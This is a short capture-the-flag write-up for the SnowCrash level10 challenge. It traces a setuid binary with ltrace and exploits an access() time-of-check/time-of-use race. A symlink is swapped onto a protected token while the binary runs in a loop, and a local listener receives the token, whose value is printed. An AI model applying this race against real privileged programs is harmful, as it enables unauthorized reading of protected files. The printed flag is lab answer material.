# Snowcrash10

Again, same things in home


```sh
ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
~$ ./level10 
./level10 file host
	sends file to host if you have access to it
~$ touch /tmp/sample ; ltrace ./level10 /tmp/sample localhost
access("/tmp/sample", 4)                                             = 0
printf("Connecting to %s:6969 .. ", "localhost")                     = 32
fflush(0xb7fd1a20Connecting to localhost:6969 .. )                                                   = 0
socket(2, 1, 0)                                                      = 3
inet_addr("localhost")                                               = 0xffffffff
htons(6969, 1, 0, 0, 0)                                              = 14619
connect(3, 0xbffff71c, 16, 0, 0)                                     = -1
printf("Unable to connect to host %s\n", "localhost"Unable to connect to host localhost
)                = 36
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

Ok so it attemps to send a file to the specified hoston port 6969, so we'll probably need a server to receive it


So let's write a dirty server and let it run on the client

We still have no access to the token tho.

The process uses access, and it seems clear that it's exploitable
https://stackoverflow.com/questions/7925177/access-security-hole

We need to have one link pointing to a file we own so that access succeeds, and then make it point to the token for the server to send it to us

We need to
	- changing the link fast
	- spam the executable and hop for a correct timing
	- getting the results

```sh
#Change links
level10:/tmp$ ./script.sh
#Spam the binary
level10:~$ while true; do ./level10 "/tmp/link" 127.0.0.1; done
#Get flag while avoiding connection check spam
level10:/tmp$ ./server | grep -v '.*('
woupa2yuojeeaaed06riuj63c
```
That was fun
